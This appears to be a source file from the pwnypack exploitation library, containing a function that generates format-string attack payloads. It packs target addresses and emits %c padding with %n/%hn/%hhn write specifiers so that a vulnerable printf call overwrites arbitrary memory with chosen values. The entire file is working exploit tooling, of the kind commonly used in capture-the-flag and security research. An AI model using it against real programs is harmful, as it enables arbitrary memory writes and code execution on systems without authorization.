import pwnypack.target
import pwnypack.packing


__all__ = ['fmtstring']


FMTSTRING_OPS = {
    1: b'hh',
    2: b'h',
    4: b'',
}


def fmtstring(offset, writes, written=0, max_width=2, target=None):
    if max_width not in (1, 2, 4):
        raise ValueError('max_width should be 1, 2 or 4')

    if target is None:
        target = pwnypack.target.target

    addrs = []
    cmds = []
    piece_writes = []

    for write in writes:
        if len(write) == 2:
            addr, value = write
            width = target.bits/8
        else:
            addr, value, width = write
            if width not in (1, 2, 4, 8):
                raise ValueError('Invalid write width')

        piece_width = min(max_width, width)
        piece_value = getattr(pwnypack.packing, 'P%d' % (8 * width))(value, target=target)
        piece_unpack = getattr(pwnypack.packing, 'U%d' % (piece_width * 8))

        for i in range(0, width, piece_width):
            piece_writes.append((piece_width, addr, piece_unpack(piece_value[i:i + piece_width], target=target)))
            addr += piece_width

    written += len(piece_writes) * int(target.bits) / 8

    piece_writes.sort(key=lambda w_a_v: (w_a_v[2] - written) % (2 ** (max_width * 8)))

    for piece_width, piece_addr, piece_value in piece_writes:
        addrs.append(pwnypack.packing.P(piece_addr, target=target))

        piece_modulo = 2 ** (piece_width * 8)

        padding = (piece_value - written) % piece_modulo
        if padding:
            cmds.append(('%%%dc' % padding).encode('ascii'))
        written = piece_value

        cmds.append(('%%%d$%sn' % (offset, FMTSTRING_OPS[piece_width])).encode('ascii'))
        offset += 1

    return b''.join(addrs + cmds)
